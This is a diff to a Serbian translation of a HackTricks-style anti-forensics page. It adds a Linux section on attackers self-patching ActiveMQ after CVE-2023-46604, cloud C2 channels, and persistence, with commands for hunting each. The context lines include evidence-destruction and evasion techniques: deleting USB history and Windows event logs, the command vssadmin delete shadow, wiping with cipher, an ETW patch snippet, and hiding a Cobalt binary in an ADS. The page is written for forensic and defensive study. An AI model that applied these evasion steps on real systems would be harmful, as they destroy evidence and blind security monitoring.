@@ -42,7 +42,7 @@ Korišćenjem istog alata moguće je identifikovati **na koji način su vremensk
 
 ### `$STANDARD_INFORMATION` i `$FILE_NAME` poređenje
 
-Još jedan način da se identifikuju sumnjivo modifikovane datoteke bio bi da se uporede vremena na oba atributa tražeći **neusklađenosti**.
+Još jedan način da se identifikuju sumnjive modifikovane datoteke bio bi da se uporede vremena na oba atributa tražeći **neusklađenosti**.
 
 ### Nanosekunde
 
@@ -54,13 +54,13 @@ Ovaj alat može modifikovati oba atributa `$STARNDAR_INFORMATION` i `$FILE_NAME`
 
 ## Data Hiding
 
-NFTS koristi klaster i minimalnu veličinu informacija. To znači da ako datoteka koristi i klaster i po jedan i po, **preostala polovina nikada neće biti korišćena** dok se datoteka ne obriše. Tada je moguće **sakriti podatke u ovom slobodnom prostoru**.
+NFTS koristi klaster i minimalnu veličinu informacija. To znači da ako datoteka koristi i klaster i po jedan i po, **preostala polovina nikada neće biti korišćena** dok se datoteka ne obriše. Stoga, moguće je **sakriti podatke u ovom slobodnom prostoru**.
 
-Postoje alati poput slacker koji omogućavaju skrivanje podataka u ovom "skrivenom" prostoru. Međutim, analiza `$logfile` i `$usnjrnl` može pokazati da su neki podaci dodati:
+Postoje alati kao što je slacker koji omogućavaju skrivanje podataka u ovom "skrivenom" prostoru. Međutim, analiza `$logfile` i `$usnjrnl` može pokazati da su neki podaci dodati:
 
 ![](<../../images/image (1060).png>)
 
-Tada je moguće povratiti slobodan prostor koristeći alate poput FTK Imager. Imajte na umu da ovaj tip alata može sačuvati sadržaj obfuskovan ili čak enkriptovan.
+Stoga, moguće je povratiti slobodan prostor koristeći alate kao što je FTK Imager. Imajte na umu da ovaj tip alata može sačuvati sadržaj obfuskovan ili čak enkriptovan.
 
 ## UsbKill
 
@@ -77,7 +77,7 @@ Ove distribucije su **izvršene unutar RAM** memorije. Jedini način da ih otkri
 
 ## Windows Configuration
 
-Moguće je onemogućiti nekoliko metoda beleženja u Windows-u kako bi se forenzička istraga učinila mnogo težom.
+Moguće je onemogućiti nekoliko metoda beleženja u Windows-u kako bi se otežala forenzička istraga.
 
 ### Disable Timestamps - UserAssist
 
@@ -109,30 +109,30 @@ Kad god se folder otvori sa NTFS volumena na Windows NT serveru, sistem uzima vr
 
 ### Delete USB History
 
-Sve **USB Device Entries** se čuvaju u Windows Registry pod **USBSTOR** ključem registra koji sadrži podključeve koji se kreiraju svaki put kada priključite USB uređaj u svoj PC ili laptop. Ovaj ključ možete pronaći ovde `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog** obrišete USB istoriju.\
+Sve **USB Device Entries** se čuvaju u Windows Registry pod **USBSTOR** ključem registra koji sadrži podključeve koji se kreiraju svaki put kada priključite USB uređaj u svoj PC ili laptop. Možete pronaći ovaj ključ ovde `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog** obrišete USB istoriju.\
 Takođe možete koristiti alat [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) da biste bili sigurni da ste ih obrisali (i da ih obrišete).
 
 Još jedna datoteka koja čuva informacije o USB-ima je datoteka `setupapi.dev.log` unutar `C:\Windows\INF`. Ova datoteka takođe treba da bude obrisana.
 
 ### Disable Shadow Copies
 
-**List** shadow kopije sa `vssadmin list shadowstorage`\
+**Lista** senčnih kopija sa `vssadmin list shadowstorage`\
 **Obrišite** ih pokretanjem `vssadmin delete shadow`
 
 Takođe ih možete obrisati putem GUI prateći korake predložene u [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
 
-Da biste onemogućili shadow kopije [koraci su ovde](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
+Da biste onemogućili senčne kopije [koraci su ovde](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
 1. Otvorite program Services tako što ćete otkucati "services" u tekstualnu pretragu nakon što kliknete na Windows dugme za pokretanje.
-2. Na listi pronađite "Volume Shadow Copy", izaberite ga, a zatim pristupite Svojstvima desnim klikom.
+2. Iz liste pronađite "Volume Shadow Copy", izaberite ga, a zatim pristupite Svojstvima desnim klikom.
 3. Izaberite Onemogućeno iz padajućeg menija "Tip pokretanja", a zatim potvrdite promenu klikom na Primeni i U redu.
 
-Takođe je moguće modifikovati konfiguraciju koje datoteke će biti kopirane u shadow kopiju u registru `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
+Takođe je moguće modifikovati konfiguraciju koje datoteke će biti kopirane u senčnu kopiju u registru `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
 
 ### Overwrite deleted files
 
 - Možete koristiti **Windows alat**: `cipher /w:C` Ovo će označiti cipher da ukloni sve podatke iz dostupnog neiskorišćenog prostora na disku unutar C diska.
-- Takođe možete koristiti alate poput [**Eraser**](https://eraser.heidi.ie)
+- Takođe možete koristiti alate kao što je [**Eraser**](https://eraser.heidi.ie)
 
 ### Delete Windows event logs
 
@@ -170,7 +170,7 @@ New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShel
 Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
 Remove-WinEvent               # requires admin & Win11 23H2+
 ```
-Defenderi bi trebali pratiti promene na tim registrima i visoki obim uklanjanja PowerShell događaja.
+Defenderi bi trebali pratiti promene na tim registrima i visoko obimno uklanjanje PowerShell događaja.
 
 ### ETW (Event Tracing for Windows) Patch
 
@@ -182,13 +182,14 @@ WriteProcessMemory(GetCurrentProcess(),
 GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
 patch, sizeof(patch), NULL);
 ```
-Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.  
-Zbog toga što je zakrpa **lokalna za proces**, EDR-ovi koji rade unutar drugih procesa mogu je propustiti.  
+Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.
+Zbog toga što je zakrpa **lokalna za proces**, EDR-ovi koji rade unutar drugih procesa mogu to propustiti.
 Detekcija: uporediti `ntdll` u memoriji naspram na disku, ili hook pre korisničkog moda.
 
 ### Oživljavanje alternativnih podataka (ADS)
 
-Kampanje malvera u 2023. (npr. **FIN12** loaderi) su primećene kako postavljaju binarne datoteke druge faze unutar ADS-a da bi ostale van vidokruga tradicionalnih skenera:
+Kampanje malvera u 2023. (npr. **FIN12** loaderi) su primećene kako postavljaju binarne datoteke druge faze
+unutar ADS-a da bi ostale van vidokruga tradicionalnih skenera:
 ```cmd
 rem Hide cobalt.bin inside an ADS of a PDF
 type cobalt.bin > report.pdf:win32res.dll
@@ -211,11 +212,88 @@ Mere zaštite: omogućite Microsoftovu blok listu ranjivih vozača (HVCI/SAC) i 
 
 ---
 
+## Linux Anti-Forensics: Samo-popravljanje i Cloud C2 (2023–2025)
+
+### Samo-popravljanje kompromitovanih servisa za smanjenje detekcije (Linux)  
+Protivnici sve više "samo-popravljaju" servis odmah nakon što ga iskoriste kako bi sprečili ponovnu eksploataciju i suprimirali detekcije zasnovane na ranjivostima. Ideja je da se ranjivi komponenti zamene najnovijim legitimnim upstream binarnim datotekama/JAR-ovima, tako da skeneri prijavljuju host kao popravljen dok persistencija i C2 ostaju.
+
+Primer: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
+- Nakon eksploatacije, napadači su preuzeli legitimne JAR-ove sa Maven Central (repo1.maven.org), obrisali ranjive JAR-ove u ActiveMQ instalaciji i ponovo pokrenuli broker.  
+- Ovo je zatvorilo inicijalni RCE dok su se održavali drugi pristupi (cron, promene SSH konfiguracije, odvojeni C2 implantati).
+
+Operativni primer (ilustrativno)
+```bash
+# ActiveMQ install root (adjust as needed)
+AMQ_DIR=/opt/activemq
+cd "$AMQ_DIR"/lib
+
+# Fetch patched JARs from Maven Central (versions as appropriate)
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar
+
+# Remove vulnerable files and ensure the service uses the patched ones
+rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
+ln -sf activemq-client-5.18.3.jar activemq-client.jar
+ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
+
+# Apply changes without removing persistence
+systemctl restart activemq || service activemq restart
+```
+Forenzička/istraživačka uputstva
+- Pregledajte direktorijume usluga za neplanirane zamene binarnih/JAR datoteka:
+- Debian/Ubuntu: `dpkg -V activemq` i uporedite heš/putanje datoteka sa repozitorijumima.
+- RHEL/CentOS: `rpm -Va 'activemq*'`
+- Potražite JAR verzije prisutne na disku koje nisu u vlasništvu menadžera paketa, ili simboličke linkove ažurirane van kanala.
+- Vremenska linija: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` za korelaciju ctime/mtime sa vremenom kompromitacije.
+- Istorija ljuske/telemetrija procesa: dokazi o `curl`/`wget` ka `repo1.maven.org` ili drugim CDN-ovima artefakata odmah nakon inicijalne eksploatacije.
+- Upravljanje promenama: validirajte ko je primenio “zakrpu” i zašto, ne samo da je prisutna verzija sa zakrpom.
+
+### Cloud‑service C2 sa bearer tokenima i anti‑analitičkim stagerima
+Posmatrano trgovanje kombinovalo je više dugoročnih C2 puteva i anti‑analitičko pakovanje:
+- Lozinkom zaštićeni PyInstaller ELF loaderi kako bi se otežalo korišćenje sandboxes i statička analiza (npr., enkriptovani PYZ, privremena ekstrakcija pod `/_MEI*`).
+- Indikatori: `strings` hitovi kao što su `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
+- Artefakti u vreme izvršavanja: ekstrakcija u `/tmp/_MEI*` ili prilagođene `--runtime-tmpdir` putanje.
+- C2 podržan Dropbox-om koristeći hardkodirane OAuth Bearer tokene
+- Mrežni markeri: `api.dropboxapi.com` / `content.dropboxapi.com` sa `Authorization: Bearer <token>`.
+- Istražujte u proxy/NetFlow/Zeek/Suricata za izlazni HTTPS ka Dropbox domenima iz serverskih radnih opterećenja koja obično ne sinhronizuju datoteke.
+- Paralelni/rezervni C2 putem tunelovanja (npr., Cloudflare Tunnel `cloudflared`), zadržavajući kontrolu ako je jedan kanal blokiran.
+- Host IOCs: `cloudflared` procesi/jedinice, konfiguracija na `~/.cloudflared/*.json`, izlazni 443 ka Cloudflare ivicama.
+
+### Postojanost i “hardening rollback” za održavanje pristupa (primeri za Linux)
+Napadači često kombinuju samopročišćavanje sa trajnim pristupnim putevima:
+- Cron/Anacron: izmene u `0anacron` stubu u svakom `/etc/cron.*/` direktorijumu za periodičnu izvršavanje.
+- Istražujte:
+```bash
+for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
+grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
+```
+- SSH konfiguracija hardening rollback: omogućavanje root prijava i menjanje podrazumevanih ljuski za nisko privilegovane naloge.
+- Istražujte za omogućavanje root prijava:
+```bash
+grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
+# vrednosti zastavica kao što su "yes" ili previše permisivne postavke
+```
+- Istražujte sumnjive interaktivne ljuske na sistemskim nalozima (npr., `games`):
+```bash
+awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
+```
+- Nasumični, kratko imenovani beacon artefakti (8 slova) postavljeni na disk koji takođe kontaktiraju cloud C2:
+- Istražujte:
+```bash
+find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
+-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
+```
+
+Odbrambeni timovi treba da koreliraju ove artefakte sa spoljnim izlaganjem i događajima zakrpa usluga kako bi otkrili anti‑forenzičko samopročišćavanje korišćeno za prikrivanje inicijalne eksploatacije.
+
 ## Reference
 
-- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (mart 2023)  
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (mart 2023)
 https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
-- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (jun 2024)  
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (jun 2024)
 https://redcanary.com/blog/etw-patching-detection
+
+- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
